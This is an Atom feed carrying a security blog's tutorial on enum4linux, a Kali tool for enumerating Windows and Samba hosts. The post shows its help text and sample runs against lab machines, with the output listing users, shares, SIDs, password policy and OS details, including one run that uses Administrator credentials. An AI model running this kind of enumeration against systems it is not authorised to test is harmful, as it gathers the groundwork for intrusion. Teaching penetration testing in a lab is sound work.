<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-19T12:53:58-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[enum4linux - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools/"/>
    <updated>2017-06-19T10:08:57-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: enumerate shares on a target and gather as much information as possible. enum4linux is a Perl script that can get the job done.</p>

<p>Homepage: <a href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>

<!-- more -->


<h2>enum4linux description</h2>

<blockquote><p>A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.</p>

<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar
functionality to enum.exe formerly available from www.bindview.com.</p>

<p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>

<p>Key features:</p>

<ul>
<li><p>RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)</p></li>
<li><p>User listing (When RestrictAnonymous is set to 0 on Windows 2000)</p></li>
<li><p>Listing of group membership information</p></li>
<li><p>Share enumeration</p></li>
<li><p>Detecting if host is in a workgroup or a domain</p></li>
<li><p>Identifying the remote operating system</p></li>
<li><p>Password policy retrieval (using polenum)</p></li>
</ul>
</blockquote>

<h2>enum4linux options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>num4linux
</span><span class='line'>enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/)
</span><span class='line'>Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)
</span><span class='line'>
</span><span class='line'>Simple wrapper around the tools in the samba package to provide similar 
</span><span class='line'>functionality to enum.exe (formerly from www.bindview.com).  Some additional 
</span><span class='line'>features such as RID cycling have also been added for convenience.
</span><span class='line'>
</span><span class='line'>Usage: ./enum4linux.pl [options] ip
</span><span class='line'>
</span><span class='line'>Options are (like "enum"):
</span><span class='line'>    -U        get userlist
</span><span class='line'>    -M        get machine list*
</span><span class='line'>    -S        get sharelist
</span><span class='line'>    -P        get password policy information
</span><span class='line'>    -G        get group and member list
</span><span class='line'>    -d        be detailed, applies to -U and -S
</span><span class='line'>    -u user   specify username to use (default "")  
</span><span class='line'>    -p pass   specify password to use (default "")   
</span><span class='line'>
</span><span class='line'>The following options from enum.exe aren't implemented: -L, -N, -D, -f
</span><span class='line'>
</span><span class='line'>Additional options:
</span><span class='line'>    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
</span><span class='line'>              This opion is enabled if you don't provide any other options.
</span><span class='line'>    -h        Display this help message and exit
</span><span class='line'>    -r        enumerate users via RID cycling
</span><span class='line'>    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
</span><span class='line'>    -K n      Keep searching RIDs until n consective RIDs don't correspond to
</span><span class='line'>              a username.  Impies RID range ends at 999999. Useful 
</span><span class='line'>        against DCs.
</span><span class='line'>    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
</span><span class='line'>    -s file   brute force guessing for share names
</span><span class='line'>    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
</span><span class='line'>              Used to get sid with "lookupsid known_username"
</span><span class='line'>            Use commas to try several users: "-k admin,user1,user2"
</span><span class='line'>    -o        Get OS information
</span><span class='line'>    -i        Get printer information
</span><span class='line'>    -w wrkg   Specify workgroup manually (usually found automatically)
</span><span class='line'>    -n        Do an nmblookup (similar to nbtstat)
</span><span class='line'>    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
</span><span class='line'>
</span><span class='line'>RID cycling should extract a list of users from Windows (or Samba) hosts 
</span><span class='line'>which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network 
</span><span class='line'>access: Allow anonymous SID/Name translation" enabled (XP, 2003).
</span><span class='line'>
</span><span class='line'>NB: Samba servers often seem to have RIDs in the range 3000-3050.
</span><span class='line'>
</span><span class='line'>Dependancy info: You will need to have the samba package installed as this 
</span><span class='line'>script is basically just a wrapper around rpcclient, net, nmblookup and 
</span><span class='line'>smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ 
</span><span class='line'>is required to get Password Policy info.</span></code></pre></td></tr></table></div></figure>


<h2>enum4linux usage</h2>

<ul>
<li>get everything you can from a host without any credentials</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux 192.168.217.131
</span><span class='line'>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 19 10:06:33 2017
</span><span class='line'>
</span><span class='line'> ========================== 
</span><span class='line'>|    Target Information    |
</span><span class='line'> ========================== 
</span><span class='line'>Target ........... 192.168.217.131
</span><span class='line'>RID Range ........ 500-550,1000-1050
</span><span class='line'>Username ......... ''
</span><span class='line'>Password ......... ''
</span><span class='line'>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Enumerating Workgroup/Domain on 192.168.217.131    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[E] Can't find workgroup/domain
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> =============================================== 
</span><span class='line'>|    Nbtstat Information for 192.168.217.131    |
</span><span class='line'> =============================================== 
</span><span class='line'>Looking up status of 192.168.217.131
</span><span class='line'>No reply from 192.168.217.131
</span><span class='line'>
</span><span class='line'> ======================================== 
</span><span class='line'>|    Session Check on 192.168.217.131    |
</span><span class='line'> ======================================== 
</span><span class='line'>Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
</span><span class='line'>[+] Server 192.168.217.131 allows sessions using username '', password ''
</span><span class='line'>[+] Got domain/workgroup name: SAMBA
</span><span class='line'>
</span><span class='line'> ============================================== 
</span><span class='line'>|    Getting domain SID for 192.168.217.131    |
</span><span class='line'> ============================================== 
</span><span class='line'>Domain Name: SAMBA
</span><span class='line'>Domain Sid: (NULL SID)
</span><span class='line'>[+] Can't determine if host is part of domain or part of a workgroup
</span><span class='line'>
</span><span class='line'> ========================================= 
</span><span class='line'>|    OS information on 192.168.217.131    |
</span><span class='line'> ========================================= 
</span><span class='line'>[+] Got OS info for 192.168.217.131 from smbclient: Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>[+] Got OS info for 192.168.217.131 from srvinfo:
</span><span class='line'>  LOCALHOST      Wk Sv PrQ Unx NT SNT Samba File Server
</span><span class='line'>  platform_id     :   500
</span><span class='line'>  os version      :   6.1
</span><span class='line'>  server type     :   0x809a03
</span><span class='line'>
</span><span class='line'> ================================ 
</span><span class='line'>|    Users on 192.168.217.131    |
</span><span class='line'> ================================ 
</span><span class='line'>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser    Name: Samba access is allowed for this user Desc: 
</span><span class='line'>
</span><span class='line'>user:[smbuser] rid:[0x3e8]
</span><span class='line'>
</span><span class='line'> ============================================ 
</span><span class='line'>|    Share Enumeration on 192.168.217.131    |
</span><span class='line'> ============================================ 
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  sharename       Disk      Only authorized users
</span><span class='line'>  IPC$            IPC       IPC Service (Samba File Server)
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>[+] Attempting to map shares on 192.168.217.131
</span><span class='line'>//192.168.217.131/sharename   Mapping: DENIED, Listing: N/A
</span><span class='line'>//192.168.217.131/IPC$    Mapping: OK Listing: DENIED
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Password Policy Information for 192.168.217.131    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[E] Unexpected error from polenum:
</span><span class='line'>Traceback (most recent call last):
</span><span class='line'>  File "/usr/bin/polenum", line 33, in &lt;module&gt;
</span><span class='line'>    from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr
</span><span class='line'>ImportError: cannot import name dcerpc_v4
</span><span class='line'>[+] Retieved partial password policy with rpcclient:
</span><span class='line'>
</span><span class='line'>Password Complexity: Disabled
</span><span class='line'>Minimum Password Length: 5
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ================================= 
</span><span class='line'>|    Groups on 192.168.217.131    |
</span><span class='line'> ================================= 
</span><span class='line'>
</span><span class='line'>[+] Getting builtin groups:
</span><span class='line'>
</span><span class='line'>[+] Getting builtin group memberships:
</span><span class='line'>
</span><span class='line'>[+] Getting local groups:
</span><span class='line'>
</span><span class='line'>[+] Getting local group memberships:
</span><span class='line'>
</span><span class='line'>[+] Getting domain groups:
</span><span class='line'>
</span><span class='line'>[+] Getting domain group memberships:
</span><span class='line'>
</span><span class='line'> ========================================================================== 
</span><span class='line'>|    Users on 192.168.217.131 via RID cycling (RIDS: 500-550,1000-1050)    |
</span><span class='line'> ========================================================================== 
</span><span class='line'>[I] Found new SID: S-1-22-1
</span><span class='line'>[I] Found new SID: S-1-5-21-3832469351-2479326917-463392201
</span><span class='line'>[I] Found new SID: S-1-5-32
</span><span class='line'>[+] Enumerating users using SID S-1-5-21-3832469351-2479326917-463392201 and logon username '', password ''
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-500 *unknown*\*unknown* (8)
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-501 LOCALHOST\nobody (Local User)
</span><span class='line'>[...]
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-513 LOCALHOST\None (Domain Group)
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-1000 LOCALHOST\smbuser (Local User)
</span><span class='line'>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
</span><span class='line'>S-1-22-1-1000 Unix User\nixhat (Local User)
</span><span class='line'>S-1-22-1-1001 Unix User\smbuser (Local User)
</span><span class='line'>[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
</span><span class='line'>S-1-5-32-500 *unknown*\*unknown* (8)
</span><span class='line'>[...]
</span><span class='line'>S-1-5-32-544 BUILTIN\Administrators (Local Group)
</span><span class='line'>S-1-5-32-545 BUILTIN\Users (Local Group)
</span><span class='line'>S-1-5-32-546 BUILTIN\Guests (Local Group)
</span><span class='line'>S-1-5-32-547 BUILTIN\Power Users (Local Group)
</span><span class='line'>S-1-5-32-548 BUILTIN\Account Operators (Local Group)
</span><span class='line'>S-1-5-32-549 BUILTIN\Server Operators (Local Group)
</span><span class='line'>S-1-5-32-550 BUILTIN\Print Operators (Local Group)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ================================================ 
</span><span class='line'>|    Getting printer info for 192.168.217.131    |
</span><span class='line'> ================================================ 
</span><span class='line'>No printers returned.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>enum4linux complete on Mon Jun 19 10:07:15 2017</span></code></pre></td></tr></table></div></figure>


<p>I edited some not found output for sanity, but you can see that even without any previous information, we were able to gather quite a few pieces, like the workgroup name, the server version, and the existing shares and users</p>

<ul>
<li>perform some enumeration while also showing the commands being run</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -n -v 192.168.217.140
</span><span class='line'>[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
</span><span class='line'>[V] Dependent program "net" found in /usr/bin/net
</span><span class='line'>[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
</span><span class='line'>[V] Dependent program "smbclient" found in /usr/bin/smbclient
</span><span class='line'>[V] Dependent program "polenum" found in /usr/bin/polenum
</span><span class='line'>[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
</span><span class='line'>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 19 10:50:48 2017
</span><span class='line'>
</span><span class='line'> ========================== 
</span><span class='line'>|    Target Information    |
</span><span class='line'> ========================== 
</span><span class='line'>Target ........... 192.168.217.140
</span><span class='line'>RID Range ........ 500-550,1000-1050
</span><span class='line'>Username ......... ''
</span><span class='line'>Password ......... ''
</span><span class='line'>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Enumerating Workgroup/Domain on 192.168.217.140    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[V] Attempting to get domain name with command: nmblookup -A '192.168.217.140'
</span><span class='line'>[+] Got domain/workgroup name: WORKGROUP
</span><span class='line'>
</span><span class='line'> =============================================== 
</span><span class='line'>|    Nbtstat Information for 192.168.217.140    |
</span><span class='line'> =============================================== 
</span><span class='line'>Looking up status of 192.168.217.140
</span><span class='line'>  WIN-D7GA2J1M0TU &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
</span><span class='line'>  WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name
</span><span class='line'>  WIN-D7GA2J1M0TU &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service
</span><span class='line'>  WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Browser Service Elections
</span><span class='line'>  WORKGROUP       &lt;1d&gt; -         M &lt;ACTIVE&gt;  Master Browser
</span><span class='line'>  ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Master Browser
</span><span class='line'>
</span><span class='line'>  MAC Address = 00-0C-29-5C-13-CA
</span><span class='line'>
</span><span class='line'> ======================================== 
</span><span class='line'>|    Session Check on 192.168.217.140    |
</span><span class='line'> ======================================== 
</span><span class='line'>[V] Attempting to make null session using command: smbclient -W 'WORKGROUP' //'192.168.217.140'/ipc$ -U''%'' -c 'help' 2&gt;&1
</span><span class='line'>[+] Server 192.168.217.140 allows sessions using username '', password ''
</span><span class='line'>
</span><span class='line'> ============================================== 
</span><span class='line'>|    Getting domain SID for 192.168.217.140    |
</span><span class='line'> ============================================== 
</span><span class='line'>[V] Attempting to get domain SID with command: rpcclient -W 'WORKGROUP' -U''%'' 192.168.217.140 -c 'lsaquery' 2&gt;&1
</span><span class='line'>could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
</span><span class='line'>could not obtain sid from server
</span><span class='line'>error: NT_STATUS_ACCESS_DENIED
</span><span class='line'>[+] Can't determine if host is part of domain or part of a workgroup
</span><span class='line'>enum4linux complete on Mon Jun 19 10:50:48 2017</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get OS information</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -o 192.168.217.140
</span><span class='line'>[...]
</span><span class='line'> ========================================= 
</span><span class='line'>|    OS information on 192.168.217.140    |
</span><span class='line'> ========================================= 
</span><span class='line'>[+] Got OS info for 192.168.217.140 from smbclient: Domain=[WIN-D7GA2J1M0TU] OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
</span><span class='line'>[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list shares on a server with credentials</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -u Administrator -p Password123! -S 192.168.217.141
</span><span class='line'>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 19 12:40:55 2017
</span><span class='line'>
</span><span class='line'> ========================== 
</span><span class='line'>|    Target Information    |
</span><span class='line'> ========================== 
</span><span class='line'>Target ........... 192.168.217.141
</span><span class='line'>RID Range ........ 500-550,1000-1050
</span><span class='line'>Username ......... 'Administrator'
</span><span class='line'>Password ......... 'Password123!'
</span><span class='line'>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Enumerating Workgroup/Domain on 192.168.217.141    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[+] Got domain/workgroup name: SANGHELIOS0
</span><span class='line'>
</span><span class='line'> ======================================== 
</span><span class='line'>|    Session Check on 192.168.217.141    |
</span><span class='line'> ======================================== 
</span><span class='line'>[+] Server 192.168.217.141 allows sessions using username 'Administrator', password 'Password123!'
</span><span class='line'>
</span><span class='line'> ============================================== 
</span><span class='line'>|    Getting domain SID for 192.168.217.141    |
</span><span class='line'> ============================================== 
</span><span class='line'>Domain Name: SANGHELIOS0
</span><span class='line'>Domain Sid: S-1-5-21-1024350911-1337957381-1412282408
</span><span class='line'>[+] Host is part of a domain (not a workgroup)
</span><span class='line'>
</span><span class='line'> ============================================ 
</span><span class='line'>|    Share Enumeration on 192.168.217.141    |
</span><span class='line'> ============================================ 
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  ADMIN$          Disk      Remote Admin
</span><span class='line'>  C$              Disk      Default share
</span><span class='line'>  IPC$            IPC       Remote IPC
</span><span class='line'>  NETLOGON        Disk      Logon server share 
</span><span class='line'>  ops             Disk      
</span><span class='line'>  SYSVOL          Disk      Logon server share 
</span><span class='line'>  testshare       Disk      A share on Windows Server
</span><span class='line'>Connection to 192.168.217.141 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
</span><span class='line'>NetBIOS over TCP disabled -- no workgroup available
</span><span class='line'>
</span><span class='line'>[+] Attempting to map shares on 192.168.217.141
</span><span class='line'>//192.168.217.141/ADMIN$  Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/C$  [E] Can't understand response:
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]
</span><span class='line'>  $Recycle.Bin                      DHS        0  Thu Jul 26 03:38:59 2012
</span><span class='line'>  Boot                              DHS        0  Sun Oct 16 18:44:49 2016
</span><span class='line'>  bootmgr                          AHSR   398156  Wed Jul 25 23:44:30 2012
</span><span class='line'>  BOOTNXT                           AHS        1  Sat Jun  2 10:30:55 2012
</span><span class='line'>  BOOTSECT.BAK                     AHSR     8192  Sun Oct 16 18:44:50 2016
</span><span class='line'>  Documents and Settings            DHS        0  Thu Jul 26 03:14:09 2012
</span><span class='line'>  pagefile.sys                      AHS 402653184  Mon Jun 19 12:08:41 2017
</span><span class='line'>  PerfLogs                            D        0  Thu Jul 26 03:44:15 2012
</span><span class='line'>  Program Files                      DR        0  Sun Oct 16 07:53:13 2016
</span><span class='line'>  Program Files (x86)                 D        0  Thu Jul 26 04:04:58 2012
</span><span class='line'>  ProgramData                        DH        0  Sun Oct 23 08:55:39 2016
</span><span class='line'>  Recovery                          DHS        0  Sun Oct 16 07:48:22 2016
</span><span class='line'>  StorageReports                      D        0  Sat Oct 22 17:17:58 2016
</span><span class='line'>  System Volume Information         DHS        0  Sat Oct 22 17:17:27 2016
</span><span class='line'>  testshare                           D        0  Mon Jun 19 12:25:50 2017
</span><span class='line'>  Users                              DR        0  Sat Oct 22 16:06:28 2016
</span><span class='line'>  Windows                             D        0  Sat Oct 22 16:49:16 2016
</span><span class='line'>
